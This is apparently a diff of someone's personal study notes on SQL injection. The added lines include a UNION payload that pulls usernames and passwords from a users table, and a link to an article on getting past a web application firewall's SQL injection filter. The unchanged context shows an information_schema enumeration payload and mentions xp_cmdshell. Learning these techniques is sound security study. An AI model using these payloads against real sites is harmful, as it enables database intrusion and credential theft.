@@ -135,6 +135,10 @@ Here, the attacker is using SQL Server’s `xp_cmdshell` to execute a system com
 
 
 
+# strategies 
+
+## triggering an error  
+try to just adding
 
 
 
@@ -146,7 +150,65 @@ Here, the attacker is using SQL Server’s `xp_cmdshell` to execute a system com
 
 
 
-## SQL syntax 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# SQL syntax 
 -` select * where  from table where user ='joe' limit 0,1  ;   --` limit is here to limit the numbers of the output 
 - ![[Pasted image 20240728121425.png]]
 - ![[Pasted image 20240728122041.png]]
@@ -161,5 +223,9 @@ Here, the attacker is using SQL Server’s `xp_cmdshell` to execute a system com
 - ` jeremy 'union select 1,2,table_name from information_schema.tables where table_schema =database() ; #`
 - you use a valid syntax and then u inject the payload 
 - portswigger sql cheat sheet 
+- you can use this query to retrieve two columns in one parameter 
+- `'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
 
 	==try to search for any thing injectable like cookies validation or any thing 
+
+https://medium.com/@amitdutta6026/bypassing-cloudflares-sql-injection-filter-without-origin-ip-discovery-2bb8c97bc5db
